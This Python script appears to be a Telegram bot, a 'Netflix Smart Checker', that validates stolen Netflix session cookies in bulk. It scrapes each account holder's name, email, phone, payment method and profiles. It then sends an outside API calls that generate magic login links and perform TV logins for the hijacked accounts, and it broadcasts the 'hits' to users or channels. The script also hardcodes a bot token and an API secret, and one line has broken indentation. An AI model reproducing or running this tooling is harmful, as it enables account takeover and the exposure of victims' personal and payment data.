import requests
import logging
import time
import urllib.parse
import io
import os
import sys
import re
import json
import threading
import telebot
import zipfile
import codecs
import concurrent.futures
from playwright.sync_api import sync_playwright
from telebot import types
from datetime import datetime, timedelta
import urllib3
from flask import Flask

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class Fore: GREEN = ""; RED = ""; YELLOW = ""; CYAN = ""; RESET = ""
    class Style: BRIGHT = ""

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

user_modes = {}
BOT_TOKEN = "8477278414:AAHAxLMV9lgqvSCjnj_AIDnH6pxm82Q55So"
ADMIN_ID = 6176299339
CHANNELS = ["@F88UFNETFLIX", "@F88UF9844"]
USERS_FILE = "users.txt"
SCREENSHOT_SEMAPHORE = threading.Semaphore(20) 

app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is Running! 24/7"

def keep_alive():
    t = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)), debug=False))
    t.daemon = True
    t.start()

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Referer": "https://www.netflix.com/",
    "Origin": "https://www.netflix.com",
}

API_BASE_URL = "http://nftgenapi.onrender.com/api"
SECRET_KEY = "KUROSAKI_YtkX2SnPDdtn0jU9fVyE0iSIGnjPaYIO"

CURRENCY_MAP = {"US": "$", "GB": "£", "IN": "₹", "CA": "C$", "AU": "A$", "BR": "R$", "MX": "Mex$", "TR": "₺", "ES": "€", "FR": "€", "DE": "€", "IT": "€", "NL": "€", "PL": "zł", "AR": "ARS$", "CO": "COP$", "CL": "CLP$", "PE": "S/", "JP": "¥", "KR": "₩", "TW": "NT$", "ZA": "R", "NG": "₦", "KE": "KSh", "EG": "E£", "SA": "SAR", "AE": "AED", "PK": "Rs", "ID": "Rp", "MY": "RM", "PH": "₱", "VN": "₫", "TH": "฿", "SG": "S$", "NZ": "NZ$", "HK": "HK$", "CH": "CHF", "SE": "kr", "NO": "kr", "DK": "kr", "RU": "₽", "UA": "₴", "CZ": "Kč", "HU": "Ft", "RO": "lei", "PT": "€", "IE": "€", "BE": "€", "AT": "€", "FI": "€", "GR": "€"}

def get_country_from_html(html):
    try:
        if '"currentCountry":"' in html: return html.split('"currentCountry":"')[1].split('"')[0]
    except: pass
    return "Unknown"

def get_flag(code):
    if not code or code == "Unknown" or len(code) != 2: return ""
    return "".join([chr(ord(c.upper()) + 127397) for c in code])

def get_currency_symbol(code): return CURRENCY_MAP.get(code, "$")

def clean_text(text):
    if not text: return "Unknown"
    try: return codecs.decode(text, 'unicode_escape')
    except: return text

def unix_to_date(timestamp):
    try:
        ts = int(timestamp)
        if ts > 1e12: ts = ts / 1000
        return datetime.fromtimestamp(ts).strftime('%Y-%m-%d')
    except: return "N/A"

def calculate_duration(member_since_str):
    try:
        since_date = datetime.strptime(member_since_str, '%Y-%m-%d')
        diff = datetime.now() - since_date
        return f"({diff.days // 365}y {(diff.days % 365) // 30}m)"
    except: return ""

def extract_deep_details(html):
    details = {"plan": "Unknown", "payment": "Unknown", "expiry": "N/A", "email": "N/A", "phone": "N/A", "country": "Unknown", "currency": "", "price": "N/A", "quality": "Unknown", "name": "Unknown", "extra_members": "Unknown", "member_since": "Unknown", "max_streams": "Unknown", "profiles": [], "status": "Unknown", "email_verified": "Unknown", "phone_verified": "Unknown"}
    
    if '"membershipStatus":"CURRENT_MEMBER"' in html or '"CURRENT_MEMBER":true' in html: details["status"] = "Active"
    elif '"membershipStatus":"FORMER_MEMBER"' in html or '"FORMER_MEMBER":true' in html: details["status"] = "Expired"
    elif '"membershipStatus":"NEVER_MEMBER"' in html or '"NEVER_MEMBER":true' in html: details["status"] = "Free/Never Paid"
    
    plan_match = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html)
    if plan_match: details["plan"] = clean_text(plan_match.group(1))
    elif re.search(r'"currentPlanName":"([^"]+)"', html): details["plan"] = clean_text(re.search(r'"currentPlanName":"([^"]+)"', html).group(1))

    qual_match = re.search(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html)
    if qual_match: details["quality"] = clean_text(qual_match.group(1))
    if details["quality"] == "Unknown":
        plan_lower = str(details["plan"]).lower()
        if "premium" in plan_lower: details["quality"] = "UHD 4K"
        elif "standard" in plan_lower: details["quality"] = "Full HD"
        elif "basic" in plan_lower: details["quality"] = "HD"
    
    price_match = re.search(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html)
    if price_match: details["price"] = clean_text(price_match.group(1))
    else:
        loc_price = re.search(r'"localizedPrice":"([^"]+)"', html)
        if loc_price: details["price"] = clean_text(loc_price.group(1))

    pm_match = re.search(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', html)
    if pm_match: details["payment"] = clean_text(pm_match.group(1))
    else:
        if "Visa" in html: details["payment"] = "Visa 💳"
        elif "MasterCard" in html or "Mastercard" in html: details["payment"] = "MasterCard 💳"
        elif "PayPal" in html: details["payment"] = "PayPal 🅿️"
    
    name_match = re.search(r'"userContext":\{"name":"([^"]+)"', html)
    if name_match: details["name"] = clean_text(name_match.group(1))
    elif re.search(r'"firstName":"([^"]+)"', html): details["name"] = clean_text(re.search(r'"firstName":"([^"]+)"', html).group(1))
    
    email_match = re.search(r'"email":"([^"]+)"', html)
    if email_match: details["email"] = clean_text(email_match.group(1))
    else:
        uc_match = re.search(r'"userContext":\{[^}]*"email":"([^"]+)"', html)
        if uc_match: details["email"] = clean_text(uc_match.group(1))
        else:
            login_id_match = re.search(r'"userLoginId":"([^"]+)"', html)
            if login_id_match: details["email"] = clean_text(login_id_match.group(1))

    if '"isEmailVerified":true' in html: details["email_verified"] = "Yes ✅"
    elif '"isEmailVerified":false' in html: details["email_verified"] = "No ❌"

    phone_match = re.search(r'"phoneNumberDigits":\{"__typename":"GrowthClearStringValue","value":"([^"]+)"\}', html)
    if phone_match: details["phone"] = clean_text(phone_match.group(1))
    
    bill_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html)
    if bill_match: details["expiry"] = clean_text(bill_match.group(1))
    
    since_match = re.search(r'"memberSince":\{"fieldType":"Numeric","value":(\d+)\}', html)
    if since_match:
        details["member_since"] = unix_to_date(since_match.group(1))
        details["member_duration"] = calculate_duration(details["member_since"])
    
    country_match = re.search(r'"currentCountry":"([^"]+)"', html)
    if country_match: details["country"] = country_match.group(1)
    
    extra_match = re.search(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":(true|false)\}', html)
    if extra_match and extra_match.group(1) == "true": details["extra_members"] = "Yes (Slot Available)"
    else: details["extra_members"] = "No ❌"

    details["profiles"] = []
    p1 = re.findall(r'\{[^}]*?"name":"([^"]+)"[^}]*?"isProfileLocked":(true|false)[^}]*?"isKids":(true|false)[^}]*?\}', html)
    if p1:
        for name, locked, kids in p1:
            status = "🔒" if locked == "true" else "🔓"
            kid_status = "👶" if kids == "true" else ""
            details["profiles"].append(f"{clean_text(name)} {status} {kid_status}")
    else:
        simple_names = re.findall(r'"profileName":"([^"]+)"', html)
        for name in list(set(simple_names)): details["profiles"].append(f"{clean_text(name)}")

    if details["name"] == "Unknown" and details["profiles"]: details["name"] = details["profiles"][0].split(' ')[0]

    return details

def call_api(endpoint, payload):
    try:
        payload["secret_key"] = SECRET_KEY
        headers = {"Content-Type": "application/json"}
        resp = requests.post(f"{API_BASE_URL}/{endpoint}", json=payload, headers=headers, timeout=10)
        return resp.json()
    except Exception as e:
        pass 
    return None

def parse_smart_cookie(cookie_input):
    cookie_input = cookie_input.strip()
    netflix_id_val = None
    
    if cookie_input.startswith('[') and cookie_input.endswith(']'):
        try:
            json_c = json.loads(cookie_input)
            for c in json_c:
                if c.get('name') == 'NetflixId':
                    netflix_id_val = c.get('value')
                    break
        except: pass
    
    if not netflix_id_val:
        if "NetflixId=" in cookie_input:
            match = re.search(r"NetflixId=([^;]+)", cookie_input)
            if match: netflix_id_val = match.group(1)
        else:
            netflix_id_val = cookie_input
            
    if netflix_id_val and "%" in netflix_id_val:
        netflix_id_val = urllib.parse.unquote(netflix_id_val)
        
    return netflix_id_val

def build_playwright_cookies(cookie_input, nid_val):
    p_cookies = []
    if cookie_input.startswith('['):
        try:
            json_c = json.loads(cookie_input)
            for c in json_c:
                p_cookies.append({
                    'name': c.get('name'),
                    'value': c.get('value'),
                    'domain': c.get('domain', '.netflix.com'),
                    'path': c.get('path', '/')
                })
            return p_cookies
        except: pass
    
    cookie_str = cookie_input
    if "NetflixId" not in cookie_input: cookie_str = f"NetflixId={cookie_input}"
    for chunk in cookie_str.split(';'):
        if '=' in chunk:
            parts = chunk.strip().split('=', 1)
            if len(parts) == 2:
                p_cookies.append({'name': parts[0], 'value': parts[1], 'domain': '.netflix.com', 'path': '/'})
    return p_cookies

def check_cookie(cookie_input):
    netflix_id_val = parse_smart_cookie(cookie_input)
    if not netflix_id_val: return {"valid": False, "msg": "Invalid Cookie Format"}

    playwright_cookies = build_playwright_cookies(cookie_input, netflix_id_val)

    api_response = None
    api_link = None
    if netflix_id_val:
        api_response = call_api("gen", {"netflix_id": netflix_id_val})
        if api_response and api_response.get("success"):
            api_link = api_response.get("login_url")

    try:
        session = requests.Session()
        session.headers.update(HEADERS)
        session.verify = False 
        
        for c in playwright_cookies: session.cookies.set(c['name'], c['value'], domain=c['domain'])

        resp = session.get("https://www.netflix.com/browse", timeout=7, allow_redirects=False)
        if resp.status_code == 302 and "login" in resp.headers.get("Location", ""): return {"valid": False, "msg": "Redirected to Login (Dead)"}
        if resp.status_code == 200 and "login" in resp.url: return {"valid": False, "msg": "Redirected to Login (Dead)"}

        resp_acc = session.get("https://www.netflix.com/account", timeout=10)
        acc_html = resp_acc.text
        deep_data = extract_deep_details(acc_html)
        
        country = get_country_from_html(acc_html)
        if deep_data["country"] != "Unknown": country = deep_data["country"]
        if deep_data["email"] == "N/A" and api_response and api_response.get("email"): deep_data["email"] = api_response.get("email")

        magic_link = api_link if api_link else "Token Not Found"
        token_source = "NFTGen API" if api_link else "None"
        
        if deep_data["status"] == "Expired": return {"valid": False, "msg": "Session Valid but Account Expired (Former Member)"}
        elif deep_data["status"] == "Free/Never Paid": return {"valid": False, "msg": "Session Valid but No Subscription (Never Member)"}

        screenshot_bytes = None
        try:
            if SCREENSHOT_SEMAPHORE.acquire(timeout=5): 
                try:
                    with sync_playwright() as p:
                        browser = p.chromium.launch(headless=True)
                        context = browser.new_context(user_agent=HEADERS['User-Agent'], viewport={'width': 1280, 'height': 720})
                        context.add_cookies(playwright_cookies)
                        page = context.new_page()
                        page.goto("https://www.netflix.com/browse", timeout=15000, wait_until='load')
                        screenshot_bytes = page.screenshot(type='jpeg', quality=50) 
                        browser.close()
                finally:
                    SCREENSHOT_SEMAPHORE.release()
        except Exception as e: pass

        return {"valid": True, "country": country, "magic_link": magic_link, "data": deep_data, "token_source": token_source, "screenshot": screenshot_bytes}
        
    except Exception as e:
        if api_link:
            return {"valid": True, "country": api_response.get("country", "Unknown"), "magic_link": api_link, "data": {"email": api_response.get("email", "Unknown"), "plan": api_response.get("plan", "Premium"), "country": api_response.get("country", "Unknown"), "price": api_response.get("price", "Unknown"), "quality": "UHD", "max_streams": "4", "payment": "Unknown", "expiry": "Unknown", "status": "Active"}, "token_source": "NFTGen API (Rescue)", "screenshot": None}
        return {"valid": False, "msg": f"Error: {str(e)}"}

def main():
    print(f"{Fore.RED}========================================")
    print(f"{Fore.WHITE}   NETFLIX SMART CHECKER BOT (TG)       ")
    print(f"{Fore.RED}========================================{Style.RESET_ALL}\n")
    keep_alive()

    bot = telebot.TeleBot(BOT_TOKEN)
    telebot.apihelper.RETRY_ON_ERROR = True 

    user_db = set()
    user_lock = threading.Lock()
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, "r") as f: user_db = set(f.read().splitlines())
        except: pass

    def save_user(user_id):
        uid = str(user_id)
        if uid not in user_db:
            with user_lock:
                if uid not in user_db:
                    user_db.add(uid)
                    try:
                        with open(USERS_FILE, "a+") as f: f.write(f"{uid}\n")
                    except: pass

    def check_sub(user_id):
        if user_id == ADMIN_ID: return True
        for channel in CHANNELS:
            try:
                stat = bot.get_chat_member(channel, user_id).status
                if stat not in ['creator', 'administrator', 'member']: return False
            except: return False
        return True

    def send_force_join(chat_id):
        markup = types.InlineKeyboardMarkup()
        for ch in CHANNELS: markup.add(types.InlineKeyboardButton(text=f"Join {ch}", url=f"https://t.me/{ch.replace('@', '')}"))
        markup.add(types.InlineKeyboardButton(text="✅ Verify Join", callback_data="verify_join"))
        bot.send_message(chat_id, "⚠️ **You must join our channels to use this bot!**", reply_markup=markup, parse_mode='Markdown')

    @bot.message_handler(commands=['start'])
    def start(message):
        save_user(message.chat.id)
        if not check_sub(message.chat.id): return send_force_join(message.chat.id)
            
        kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
        kb.add("📩 Send Here (DM)", "📡 Send to Channel")
        kb.add("📺 TV Login", "🛑 Stop System")
        
        welcome_msg = (
            "**🔥 Netflix Direct Scraper V32 (Smart Edition)**\n\n"
            "👋 **Welcome!** Choose a mode below to start.\n\n"
            "📁 **Supported Inputs:**\n"
            "• Direct Text Message\n"
            "• `.txt` File\n"
            "• `.zip` File (containing .txt)\n\n"
            "🍪 **Supported Cookie Formats:**\n"
            "1️⃣ **Raw Format:**\n`NetflixId=ct%3DBgjHl...`\n\n"
            "2️⃣ **JSON Format:**\n`[{\"name\": \"NetflixId\", \"value\": \"...\"}]`\n\n"
            "👇 **Select Mode to Begin:**"
        )
        bot.send_message(message.chat.id, welcome_msg, reply_markup=kb, parse_mode='Markdown')

    @bot.callback_query_handler(func=lambda call: call.data == "verify_join")
    def verify_join(call):
        if check_sub(call.message.chat.id):
            bot.delete_message(call.message.chat.id, call.message.message_id)
            kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
            kb.add("📩 Send Here (DM)", "📡 Send to Channel")
            kb.add("📺 TV Login", "🛑 Stop System")
            bot.send_message(call.message.chat.id, "**✅ Verified!**\nSelect Mode:", reply_markup=kb, parse_mode='Markdown')
        else: bot.answer_callback_query(call.id, "❌ You haven't joined all channels yet!", show_alert=True)

    @bot.message_handler(func=lambda m: m.text == "📺 TV Login")
    def tv_login_start(message):
        msg = bot.reply_to(message, "📺 **TV Login Mode Activated**\n\n1️⃣ Please send your **Netflix Cookie** first (JSON or Raw).")
        bot.register_next_step_handler(msg, process_tv_cookie)

    def process_tv_cookie(message):
        cookie = message.text.strip()
        msg = bot.reply_to(message, "⏳ **Checking Cookie Validity...** Please wait.")
        
        res = check_cookie(cookie)
        
        if not res.get("valid"):
            bot.edit_message_text(f"❌ **Invalid or Dead Cookie!**\n{res.get('msg', 'Try another one.')}\n\nClick '📺 TV Login' to try again.", chat_id=message.chat.id, message_id=msg.message_id)
            return

        netflix_id_clean = parse_smart_cookie(cookie)
        plan_name = res.get('data', {}).get('plan', 'Premium')
        country_name = res.get('country', 'Unknown')
        
        bot.edit_message_text(f"✅ **Cookie Validated!**\n👑 **Plan:** {plan_name}\n🌍 **Region:** {country_name}\n\n2️⃣ Now enter the **8-Digit TV Code** shown on your TV screen.", chat_id=message.chat.id, message_id=msg.message_id)
        bot.register_next_step_handler(message, lambda m: execute_tv_login(m, netflix_id_clean))

    def execute_tv_login(message, netflix_id):
        tv_code = message.text.strip()
        bot.reply_to(message, "⏳ **Processing TV Login...** Please wait.")
        res = call_api("tvlogin", {"netflix_id": netflix_id, "tv_code": tv_code})
        
        if res and res.get("success"): bot.reply_to(message, f"✅ **TV Login Successful!** 🎉\n\n**Status:** {res.get('message', 'Logged in to TV')}")
        else:
            err = res.get("message", "Unknown Error / API Offline") if res else "API is unreachable right now."
            bot.reply_to(message, f"❌ **TV Login Failed!**\n\n**Reason:** {err}")

    @bot.message_handler(func=lambda m: m.text == "🛑 Stop System")
    def stop_sys(message):
        if message.chat.id in user_modes: user_modes[message.chat.id]['stop'] = True
        else: user_modes[message.chat.id] = {'stop': True}
        bot.reply_to(message, "**🛑 Scanning Stopped.**", parse_mode='Markdown')

    @bot.message_handler(func=lambda m: m.text == "📩 Send Here (DM)")
    def mode_dm(message):
        user_modes[message.chat.id] = {'target': message.chat.id, 'stop': False}
        bot.reply_to(message, "**✅ DM Mode Active.** Send file or text now.", parse_mode='Markdown')

    # --- ADVANCED CHANNEL VERIFICATION ---
    @bot.message_handler(func=lambda m: m.text == "📡 Send to Channel")
    def mode_ch(message):
        msg = bot.reply_to(message, "📡 **Enter Channel ID** (e.g., `-100xxxx`):\n_Make sure the bot is added as an Admin in that channel._", parse_mode='Markdown')
        bot.register_next_step_handler(msg, preview_ch)

    def preview_ch(message):
        try:
            chat_id = int(message.text.strip())
            # Check if bot can access the channel and get its name
        chat = bot.get_chat(chat_id)
            chat_name = chat.title or "Unknown Channel"
            
            markup = types.InlineKeyboardMarkup()
            markup.add(
                types.InlineKeyboardButton("✅ Confirm", callback_data=f"conf_ch_{chat_id}"),
                types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_ch")
            )
            bot.reply_to(message, f"📡 **Channel Found!**\n\n**Name:** {chat_name}\n**ID:** `{chat_id}`\n\nIs this correct?", reply_markup=markup, parse_mode='Markdown')
        except Exception as e:
            bot.reply_to(message, "❌ **Error!** Either the ID is invalid, or the bot is NOT an Admin in that channel.", parse_mode='Markdown')

    @bot.callback_query_handler(func=lambda call: call.data.startswith("conf_ch_") or call.data == "cancel_ch")
    def handle_ch_confirmation(call):
        if call.data == "cancel_ch":
            bot.delete_message(call.message.chat.id, call.message.message_id)
            bot.send_message(call.message.chat.id, "❌ **Action Cancelled.** Select a mode again.", parse_mode='Markdown')
        else:
            chat_id = int(call.data.split("conf_ch_")[1])
            user_modes[call.message.chat.id] = {'target': chat_id, 'stop': False}
            bot.delete_message(call.message.chat.id, call.message.message_id)
            bot.send_message(call.message.chat.id, f"✅ **Channel Set Successfully!**\nHits will be sent to `{chat_id}`.\n\nNow send your cookies.", parse_mode='Markdown')

    @bot.message_handler(content_types=['document', 'text'])
    def handle_input(message):
        uid = message.chat.id
        save_user(uid) 
        if not check_sub(uid): return send_force_join(uid)
            
        mode = user_modes.get(uid)
        text_content = message.text.strip() if message.text else ""
        
        if text_content and (text_content.startswith("/") or text_content in ["📩 Send Here (DM)", "📡 Send to Channel", "📺 TV Login", "🛑 Stop System"]): return
        if not mode: return bot.reply_to(message, "❌ **Select a mode first!**", parse_mode='Markdown')
        if mode.get('stop'): return bot.reply_to(message, "🛑 **System is stopped.**\nClick a Mode button to resume.")

        valid_cookies = []
        try:
            if message.content_type == 'document':
                file_info = bot.get_file(message.document.file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                
                if message.document.file_name.endswith('.zip'):
                    with zipfile.ZipFile(io.BytesIO(downloaded_file)) as z:
                        for filename in z.namelist():
                            if filename.endswith('.txt'):
                                with z.open(filename) as f: 
                                    content = f.read().decode('utf-8', errors='ignore')
                                    if content.strip().startswith('[') and content.strip().endswith(']'): valid_cookies.append(content)
                                    else: valid_cookies.extend([line for line in content.splitlines() if len(line) > 20])
                else: 
                    content = downloaded_file.decode('utf-8', errors='ignore')
                    if content.strip().startswith('[') and content.strip().endswith(']'): valid_cookies.append(content)
                    else: valid_cookies.extend([line for line in content.splitlines() if len(line) > 20])
            else: 
                if text_content.startswith('[') and text_content.endswith(']'):
                    valid_cookies.append(text_content) 
                elif 'NetflixId=' in text_content and not '\n' in text_content:
                    valid_cookies.append(text_content) 
                else:
                    valid_cookies.extend([line for line in text_content.splitlines() if len(line) > 20])
            
            if not valid_cookies: return bot.reply_to(message, "❌ **No Valid Cookies Found!**", parse_mode='Markdown')

            bot.reply_to(message, f"🚀 **Checking {len(valid_cookies)} Cookies...**\n_Task started in background at ultra-fast speed!_", parse_mode='Markdown')
            
            def background_checker(cookies, chat_id, target):
                valid_count = 0
                hits_list = [] 

                def process_cookie(cookie):
                    if user_modes.get(chat_id, {}).get('stop'): return None
                    try:
                        res = check_cookie(cookie)
                        if res["valid"]:
                            send_hit(target, res, cookie)
                            return (res, cookie) 
                    except: pass
                    return None

                with concurrent.futures.ThreadPoolExecutor(max_workers=60) as executor:
                    futures = [executor.submit(process_cookie, c) for c in cookies]
                    for future in concurrent.futures.as_completed(futures):
                        if user_modes.get(chat_id, {}).get('stop'): break
                        result = future.result()
                        if result:
                            valid_count += 1
                            hits_list.append(result)
                
                if hits_list:
                    try:
                        summary = f"========================================\nNETFLIX HITS SUMMARY\nAdmin: https://t.me/F88UF\nChannel: https://t.me/F88UF9844\n========================================\n\n"
                        for res, cookie in hits_list:
                            data = res.get("data", {})
                            summary += f"Country: {res.get('country', 'Unknown')}\n"
                            summary += f"Email: {data.get('email', 'N/A')}\n"
                            summary += f"Plan: {data.get('plan', 'N/A')}\n"
                            summary += f"Login: {res.get('magic_link', 'N/A')}\n"
                            
                            if str(cookie).startswith('['): summary += f"Cookie: [JSON Cookie Hidden For Space]\n"
                            else: summary += f"Cookie: {cookie}\n"
                            
                            summary += "-"*40 + "\n"
                        summary += "\n========================================\nJoin Channel: https://t.me/F88UF9844\n========================================"
                        
                        with io.BytesIO(summary.encode('utf-8')) as f:
                            f.name = f"Netflix_Hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                            bot.send_document(chat_id, f, caption="📂 **Here is your Hits Summary File**")
                    except Exception as e: pass

                try: bot.send_message(chat_id, f"✅ **Check Complete.** Hits: {valid_count}", parse_mode="Markdown")
                except: pass

            threading.Thread(target=background_checker, args=(valid_cookies, uid, mode['target'])).start()

        except Exception as e: bot.reply_to(message, f"❌ Error: {e}")

    def send_hit(chat_id, res, cookie):
        data = res.get("data", {})
        def esc(t): return str(t).replace("_", "\\_").replace("*", "\\*").replace("`", "\\`")

        country_code = res.get('country', 'Unknown')
        flag = get_flag(country_code)
        currency_sym = get_currency_symbol(country_code)
        
        price = data.get('price', 'Unknown')
        if price != 'Unknown' and currency_sym not in price: price = f"{currency_sym} {price}"
        
        markup = types.InlineKeyboardMarkup()
        login_url = res.get('magic_link', 'Token Not Found')
        
        if login_url and "http" in login_url and login_url != "Token Not Found":
            btn_login = types.InlineKeyboardButton("🔗 Login (Magic Link)", url=login_url)
            markup.add(btn_login)
        else: login_url = "https://www.netflix.com/login" 
        
        lines = []
        lines.append("🌟 **NETFLIX PREMIUM ULTRA HIT** 🌟")
        lines.append("")
        lines.append(f"🟢 **STATUS:** Active ✅")
        if country_code != "Unknown": lines.append(f"🌍 **REGION:** {esc(country_code)} {flag}")
            
        if data.get('member_since') and data['member_since'] != "Unknown":
            duration = data.get('member_duration', '')
            lines.append(f"⏰ **MEMBER SINCE:** {esc(data['member_since'])} {esc(duration)}")
        
        lines.append(f"👤 **OWNER:** {esc(data.get('name', 'Unknown'))}")
        lines.append(f"👑 **PLAN:** {esc(data.get('plan', 'Premium'))}")
        if price != "Unknown" and price != "N/A": lines.append(f"💰 **PRICE:** {esc(price)}")
        
        payment_info = data.get('payment', 'Unknown')
        lines.append(f"💳 **PAYMENT:** {esc(payment_info)}")
        
        if data.get('expiry') and data['expiry'] != "N/A": lines.append(f"📅 **NEXT BILLING:** {esc(data['expiry'])}")
            
        if data.get('profiles'):
            profile_str = ", ".join(data['profiles'])
            lines.append(f"🎭 **PROFILES:** {esc(profile_str)}")
            
        lines.append(f"📧 **EMAIL:** {esc(data.get('email', 'N/A'))}")
        if data.get('email_verified') != "Unknown": lines.append(f"   └ {esc(data['email_verified'])} Verified")
            
        lines.append(f"☎️ **PHONE:** {esc(data.get('phone', 'N/A'))}")
        lines.append(f"👥 **EXTRA MEMBERS:** {esc(data.get('extra_members', 'No ❌'))}")
        lines.append("")
        lines.append(f"💜 [CLICK HERE TO LOGIN]({login_url}) 💜")
        lines.append("")
        lines.append("━━━━━━━━━━━━━━━━━━━━━━")
        lines.append("👨‍💻 **Admin:** [Message Me](https://t.me/F88UF) | 📢 **Channel:** [Join Here](https://t.me/F88UF9844)")
        
        msg = "\n".join(lines)
        
        if res.get('screenshot'):
            try:
                img = io.BytesIO(res['screenshot'])
                img.name = 'screenshot.jpg' 
                bot.send_photo(chat_id, img, caption=msg, parse_mode="Markdown", reply_markup=markup)
            except Exception as e:
                bot.send_message(chat_id, msg, parse_mode="Markdown", reply_markup=markup, disable_web_page_preview=True)
                try:
                    img.seek(0)
                    bot.send_photo(chat_id, img, caption="Screenshot (Caption failed)")
                except: pass
        else: bot.send_message(chat_id, msg, parse_mode="Markdown", reply_markup=markup, disable_web_page_preview=True)

    while True:
        try: bot.infinity_polling(timeout=90, long_polling_timeout=60, skip_pending=True)
        except Exception as e:
            if "409" in str(e): time.sleep(15)
            else: time.sleep(5)

if __name__ == "__main__": main()
